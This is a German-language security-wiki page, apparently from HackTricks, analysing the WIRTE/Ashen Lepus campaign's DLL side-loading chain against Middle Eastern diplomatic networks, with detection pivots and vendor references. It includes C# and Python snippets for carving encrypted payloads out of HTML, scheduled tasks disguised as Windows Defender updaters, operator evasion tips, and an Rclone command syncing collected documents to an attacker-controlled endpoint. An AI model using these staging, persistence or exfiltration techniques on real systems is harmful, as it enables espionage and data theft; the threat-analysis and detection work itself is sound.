# Fortgeschrittene DLL Side-Loading mit HTML-Embedded Payload Staging

{{#include ../../../banners/hacktricks-training.md}}

## Tradecraft-Übersicht

Ashen Lepus (aka WIRTE) setzte ein wiederholbares Muster ein, das DLL sideloading, staged HTML payloads und modulare .NET-Backdoors verknüpft, um in diplomatischen Netzwerken im Nahen Osten persistent zu bleiben. Die Technik ist für jeden Operator wiederverwendbar, weil sie auf Folgendem beruht:

- **Archive-based social engineering**: harmlose PDFs fordern Ziele auf, ein RAR-Archiv von einer File-Sharing-Seite herunterzuladen. Das Archiv bündelt einen echt aussehenden Document Viewer EXE, eine bösartige DLL, die nach einer vertrauenswürdigen Bibliothek benannt ist (z. B. `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`), und eine Lockvogel-`Document.pdf`.
- **DLL search order abuse**: das Opfer doppelklickt die EXE, Windows löst den DLL-Import aus dem aktuellen Verzeichnis auf, und der bösartige Loader (AshenLoader) läuft im vertrauenswürdigen Prozess, während die Lockvogel-PDF geöffnet wird, um keinen Verdacht zu erregen.
- **Living-off-the-land staging**: jede spätere Stufe (AshenStager → AshenOrchestrator → modules) verbleibt bis zur Verwendung nicht auf der Festplatte und wird als verschlüsselte Blobs geliefert, die in ansonsten harmlosen HTML-Antworten versteckt sind.

## Mehrstufige Side-Loading-Kette

1. **Decoy EXE → AshenLoader**: die EXE side-loadet AshenLoader, der Host recon durchführt, AES-CTR verschlüsselt und ihn via POST in rotierenden Parametern wie `token=`, `id=`, `q=` oder `auth=` an API-ähnliche Pfade (z. B. `/api/v2/account`) sendet.
2. **HTML extraction**: der C2 verrät die nächste Stufe nur, wenn die Client-IP in die Zielregion geolokalisiert wird und der `User-Agent` mit dem Implant übereinstimmt, was Sandboxes frustriert. Wenn die Prüfungen bestanden sind, enthält der HTTP-Body einen `<headerp>...</headerp>`-Blob mit dem Base64/AES-CTR-verschlüsselten AshenStager-Payload.
3. **Second sideload**: AshenStager wird zusammen mit einer weiteren legitimen Binärdatei deployed, die `wtsapi32.dll` importiert. Die bösartige Kopie, die in die Binärdatei injiziert wurde, holt weiteres HTML und carve´t dieses Mal `<article>...</article>`, um AshenOrchestrator wiederherzustellen.
4. **AshenOrchestrator**: ein modularer .NET-Controller, der eine Base64 JSON-Konfiguration dekodiert. Die Config-Felder `tg` und `au` werden konkateniert/gehasht und bilden den AES-Schlüssel, mit dem `xrk` entschlüsselt wird. Die resultierenden Bytes dienen anschließend als XOR-Key für jede gefetchte Modul-Blob.
5. **Module delivery**: jedes Modul wird durch HTML-Kommentare beschrieben, die den Parser zu einem beliebigen Tag umleiten und statische Regeln umgehen, die nur nach `<headerp>` oder `<article>` suchen. Module umfassen Persistenz (`PR*`), Uninstaller (`UN*`), Reconnaissance (`SN`), Screen Capture (`SCT`) und File Exploration (`FE`).

### HTML-Container-Parsing-Muster
```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```
Selbst wenn Verteidiger ein bestimmtes Element blockieren oder entfernen, muss der Operator nur das im HTML-Kommentar angedeutete tag ändern, um die Auslieferung wieder aufzunehmen.

### Schneller Extraktionshelfer (Python)
```python
import base64, re, requests

html = requests.get(url, headers={"User-Agent": ua}).text
tag = re.search(r"<!--\s*TAG:\s*<(.*?)>\s*-->", html, re.I).group(1)
b64 = re.search(fr"<{tag}>(.*?)</{tag}>", html, re.S | re.I).group(1)
blob = base64.b64decode(b64)
# decrypt blob with AES-CTR, then XOR if required
```
## HTML Staging Evasion Parallels

Aktuelle HTML smuggling-Forschung (Talos) hebt Payloads hervor, die als Base64-Strings innerhalb von `<script>`-Blöcken in HTML-Anhängen verborgen sind und zur Laufzeit per JavaScript decodiert werden. Derselbe Trick lässt sich für C2-Antworten wiederverwenden: verschachtelte, verschlüsselte Blobs innerhalb eines `<script>`-Tags (oder eines anderen DOM-Elements) ablegen und sie im Speicher vor AES/XOR-Decodierung entpacken, sodass die Seite wie gewöhnliches HTML aussieht. Talos zeigt auch geschichtete Obfuskation (Identifier-Umbenennung plus Base64/Caesar/AES) innerhalb von `<script>`-Tags, was sich sauber auf HTML-gestagte C2-Blobs abbildet.

## Recent Variant Notes (2024-2025)

- Check Point beobachtete 2024 WIRTE-Kampagnen, die weiterhin auf archivbasierte sideloading setzten, aber `propsys.dll` (stagerx64) als erste Stufe verwendeten. Der Stager decodiert die nächste Payload mit Base64 + XOR (Key `53`), sendet HTTP-Anfragen mit einem hartkodierten `User-Agent` und extrahiert verschlüsselte Blobs, die zwischen HTML-Tags eingebettet sind. In einem Zweig wurde die Stufe aus einer langen Liste eingebetteter IP-Strings rekonstruiert, die via `RtlIpv4StringToAddressA` decodiert und dann zu den Payload-Bytes konkateniert wurden.
- OWN-CERT dokumentierte frühere WIRTE-Tooling-Fassungen, bei denen der side-geloadete `wtsapi32.dll`-Dropper Strings mit Base64 + TEA schützte und den DLL-Namen selbst als Dekryptionsschlüssel nutzte, bevor Host-Identifikationsdaten per XOR/Base64 verschleiert und an das C2 gesendet wurden.

## Crypto & C2 Hardening

- **AES-CTR everywhere**: aktuelle Loader betten 256-bit-Keys plus Nonces ein (z. B. `{9a 20 51 98 ...}`) und fügen optional eine XOR-Schicht unter Verwendung von Strings wie `msasn1.dll` vor/nach der Dekryption hinzu.
- **Key material variations**: frühere Loader nutzten Base64 + TEA zum Schutz eingebetteter Strings, wobei der Dekryptionsschlüssel aus dem bösartigen DLL-Namen (z. B. `wtsapi32.dll`) abgeleitet wurde.
- **Infrastructure split + subdomain camouflage**: Staging-Server sind pro Tool getrennt, in verschiedenen ASNs gehostet und werden manchmal durch legitim aussehende Subdomains getarnt, sodass das Abschalten einer Stage nicht den Rest preisgibt.
- **Recon smuggling**: aufgezählte Daten enthalten nun Program Files-Listings, um hochrelevante Apps zu identifizieren, und werden immer verschlüsselt, bevor sie den Host verlassen.
- **URI churn**: Query-Parameter und REST-Pfade rotieren kampagnenübergreifend (`/api/v1/account?token=` → `/api/v2/account?auth=`), wodurch fragile Erkennungen ungültig werden.
- **User-Agent pinning + safe redirects**: C2-Infrastruktur antwortet nur auf exakte UA-Strings und leitet sonst auf harmlose News-/Gesundheitsseiten um, um sich einzufügen.
- **Gated delivery**: Server sind geo-gegrenzt und antworten nur auf echte Implants. Nicht genehmigte Clients erhalten unauffälliges HTML.

## Persistence & Execution Loop

AshenStager legt Scheduled Tasks ab, die als Windows-Maintenance-Jobs getarnt sind und via `svchost.exe` ausgeführt werden, z. B.:

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

Diese Tasks starten die Sideloading-Kette beim Boot oder in Intervallen neu und stellen sicher, dass AshenOrchestrator frische Module anfordern kann, ohne erneut auf die Festplatte zu schreiben.

## Using Benign Sync Clients for Exfiltration

Operatoren legen diplomatische Dokumente in `C:\Users\Public` (weltlesbar und unverdächtig) über ein dediziertes Modul ab und laden dann das legitime [Rclone](https://rclone.org/)–Binary herunter, um dieses Verzeichnis mit Angreifer-Speicher zu synchronisieren. Unit42 stellt fest, dass dies das erste Mal ist, dass dieser Akteur Rclone für Exfiltration nutzt, was dem breiteren Trend entspricht, legitime Sync-Tools zu missbrauchen, um sich in normalen Traffic einzufügen:

1. **Stage**: Ziel-Dateien nach `C:\Users\Public\{campaign}\` kopieren/sammeln.
2. **Configure**: Eine Rclone-Konfiguration liefern, die auf einen Angreifer-gesteuerten HTTPS-Endpunkt zeigt (z. B. `api.technology-system[.]com`).
3. **Sync**: `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet` ausführen, sodass der Traffic normalen Cloud-Backups ähnelt.

Da Rclone weit verbreitet für legitime Backup-Workflows verwendet wird, müssen Verteidiger auf anomale Ausführungen achten (neue Binaries, seltsame Remotes oder plötzliches Synchronisieren von `C:\Users\Public`).

## Detection Pivots

- Alarm bei **signed processes**, die unerwartet DLLs aus benutzerbeschreibbaren Pfaden laden (Procmon-Filter + `Get-ProcessMitigation -Module`), besonders wenn die DLL-Namen mit `netutils`, `srvcli`, `dwampi` oder `wtsapi32` überlappen.
- Untersuchen verdächtiger HTTPS-Antworten auf **große Base64-Blobs, die in ungewöhnlichen Tags eingebettet sind** oder durch `<!-- TAG: <xyz> -->`-Kommentare geschützt werden.
- HTML-Hunting auf **Base64-Strings innerhalb von `<script>`-Blöcken** (HTML smuggling–Style Staging) ausweiten, die per JavaScript decodiert werden, bevor AES/XOR angewendet wird.
- Nach **Scheduled Tasks** suchen, die `svchost.exe` mit Nicht-Service-Argumenten ausführen oder auf Dropper-Verzeichnisse zurückzeigen.
- C2-Redirects verfolgen, die nur Payloads für exakte `User-Agent`-Strings zurückgeben und sonst zu legitimen News-/Health-Domains weiterleiten.
- Auf **Rclone**-Binaries achten, die außerhalb IT-verwalteter Orte auftauchen, neue `rclone.conf`-Dateien oder Sync-Jobs, die von Staging-Verzeichnissen wie `C:\Users\Public` ziehen.

## References

- [Hamas-Affiliated Ashen Lepus Targets Middle Eastern Diplomatic Entities With New AshTag Malware Suite](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- [Hidden between the tags: Insights into evasion techniques in HTML smuggling](https://blog.talosintelligence.com/hidden-between-the-tags-insights-into-evasion-techniques-in-html-smuggling/)
- [Hamas-affiliated Threat Actor WIRTE Continues its Middle East Operations and Moves to Disruptive Activity](https://research.checkpoint.com/2024/hamas-affiliated-threat-actor-expands-to-disruptive-activity/)
- [WIRTE: In Search of Lost Time](https://www.own.security/en/ressources/blog/wirte-analyse-campagne-cyber-own-cert)

{{#include ../../../banners/hacktricks-training.md}}
